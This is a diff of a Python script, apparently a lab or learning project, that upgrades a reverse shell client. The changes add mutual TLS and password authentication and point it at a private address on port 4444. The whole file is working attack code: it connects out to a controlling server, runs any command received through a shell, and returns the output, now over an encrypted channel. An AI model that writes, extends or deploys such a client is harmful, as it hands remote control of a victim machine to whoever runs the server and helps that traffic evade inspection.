@@ -1,102 +1,114 @@
 #!/usr/bin/env python3
-"""
-Reverse Shell Client
---------------------
-This client connects back to the server and waits for commands.
-It handles directory change requests specially and executes all other commands.
-Includes password-based authentication.
-"""
 
+"""
+Secure Reverse Shell Client with Mutual TLS and Password Auth
+"""
 import socket
+import ssl
 import os
 import subprocess
 import sys
 import getpass
 
-
-
 # Server configuration
-SERVER_IP = "10.0.2.15"
-SERVER_PORT = 9999
+SERVER_IP   = "192.168.2.152"
+SERVER_PORT = 4444
+
+# Paths to certificates/keys
+CA_FILE     = "certs/ca.crt"
+CLIENT_CERT = "certs/client.crt"
+CLIENT_KEY  = "certs/client.key"
+
+def create_client_context(ca_file, cert_file, key_file):
+    """
+    Client-side TLS context:
+    - Purpose.SERVER_AUTH validates the server cert.
+    - cafile ensures we only trust certs signed by our CA.
+    - load_cert_chain presents our client cert & key.
+    """
+    ctx = ssl.create_default_context(
+        ssl.Purpose.SERVER_AUTH,
+        cafile=ca_file
+    )
+    ctx.load_cert_chain(certfile=cert_file, keyfile=key_file)
+    
+    return ctx
 
 def authenticate(sock):
     """
-    Perform password-based authentication with the server
+    Perform password-based authentication over the encrypted channel.
     """
     try:
-        # Get password from user (won't display as they type)
         password = getpass.getpass("Enter password: ")
-        
-        # Send the password to the server
-        sock.send(password.encode('utf-8'))
-        
-        # Get authentication result
+        sock.sendall(password.encode('utf-8'))
         result = sock.recv(1024).decode('utf-8')
-        if result == "AUTH_SUCCESS":
-            print("Authentication successful")
+        if result.strip() == "AUTH_SUCCESS":
+            print("[+] Authentication successful")
             return True
         else:
-            print("Authentication failed")
+            print("[-] Authentication failed")
             return False
     except Exception as e:
-        print(f"Authentication error: {e}")
+        print(f"[!] Authentication error: {e}")
         return False
 
 def main():
-    # Create a socket and try to connect to the server
+    # Build TLS context and wrap socket
+    context = create_client_context(CA_FILE, CLIENT_CERT, CLIENT_KEY)
+    raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    # Pass server_hostname for SNI and hostname verification
+    tls_sock = context.wrap_socket(
+        raw_sock,
+        server_hostname=SERVER_IP
+    )
+
+    # Connect (performs TLS handshake)
     try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.connect((SERVER_IP, SERVER_PORT))
-    except socket.error as e:
+        tls_sock.connect((SERVER_IP, SERVER_PORT))
+        print(f"[+] Connected to {SERVER_IP}:{SERVER_PORT} over TLS")
+    except Exception as e:
         sys.exit(f"Connection failed: {e}")
-        
-    # Authenticate with the server
-    if not authenticate(sock):
-        sock.close()
+
+    # Password authentication
+    if not authenticate(tls_sock):
+        tls_sock.close()
         sys.exit(1)
 
-    # Loop to receive and execute commands
+    # Command loop
     while True:
         try:
-            data = sock.recv(1024)  # Wait for data
+            data = tls_sock.recv(1024)
             if not data:
+                print("[*] Server closed the connection.")
                 break
-            
-            command = data.decode("utf-8", errors="ignore")  # decode command string
-            
-            # Special handling for "cd" command
+
+            command = data.decode("utf-8", errors="ignore")
+
             if command.startswith("cd "):
                 try:
                     os.chdir(command[3:].strip())
                     output = ""
                 except OSError as e:
-                    output = f"An error changing directory: {e}"
+                    output = f"cd error: {e}\n"
             else:
-                # Run the command with subprocess
-                process = subprocess.Popen(
-                    command, 
-                    shell=True, 
+                proc = subprocess.Popen(
+                    command, shell=True,
                     stdout=subprocess.PIPE,
                     stderr=subprocess.PIPE,
                     stdin=subprocess.PIPE
                 )
-                stdout, stderr = process.communicate()
-                output = stdout.decode() + stderr.decode()  # Combine output
+                stdout, stderr = proc.communicate()
+                output = stdout.decode() + stderr.decode()
 
-            # Append the current directory path like a shell prompt
-            cwd = os.getcwd() + ">"
-            final_output = output + cwd
-
-            # Send result to the server
-            sock.send(final_output.encode("utf-8"))
+            # Append prompt
+            output += os.getcwd() + "> "
+            tls_sock.sendall(output.encode("utf-8"))
 
         except Exception as e:
-            sock.send(f"Error: {e}\n".encode("utf-8"))  # Send back any exception
+            tls_sock.sendall(f"Error: {e}\n".encode("utf-8"))
             break
-            
-    sock.close()  # Close socket connection
 
-# Entry point
+    tls_sock.close()
+
 if __name__ == '__main__':
     main()
-
